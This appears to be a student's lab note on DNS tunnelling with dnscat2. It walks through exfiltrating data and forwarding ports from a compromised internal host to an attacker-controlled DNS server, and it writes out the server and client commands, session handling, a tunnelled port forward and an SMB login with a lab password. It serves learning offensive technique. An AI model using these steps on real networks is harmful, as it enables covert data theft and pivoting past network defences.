
data can be infiltrated and exfiltrated in small amounts through dns requests if we are in control of a dns server. We can send data through A queries and receive data with TXT queries from an internal network to an outside network that we can control.

we can use `dnsmasq` to configure simple dns on a server we control which can be queried from an internal server we've compromised.
### Tunneling with dnscat2

We can use dnscat to exfiltrate data with DNS subdomain queries and infiltrate data with TXT and other records.

set up network sniffing on DNS server we control:
```
sudo tcpdump -i ens192 udp port 53
```

set up dns server:
```
dnscat2-server feline.corp
```

on the client (compromised machine) we need to transfer the dnscat binary.

run the client (I believe we are defining our own domain name here? as the intermediary machine is resolving that were not interacting with):
```
dnscat feline.corp
```

the above steps creates a connection between dns server and client, we can now monitor all dns traffic on our server through the tcp listener we created.

now we can interact with out session on our dns server

list active sessions:
```
windows
```

select an active session for interacting with:
```
windows -i <num>
```

use question mark to list available commands:
```
?
```

learn how to use a command:
```
<command> --help
```

setting up a port forward:
```
listen <local ip>:<local port> <target_ip>:<target_port>
```

we can use this to port forward using our dns session on the dns server.

We can now run tools against the target through another shell on the dns server:
```
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

`setting a listener on 0.0.0.0 will allow our kali machine to directly interact with the dns server machine and grant us a tunnel to interact with the target machine we specified in the listener`

```
./dnscat_exercise_client -i 192.168.226.7 -p 8989
```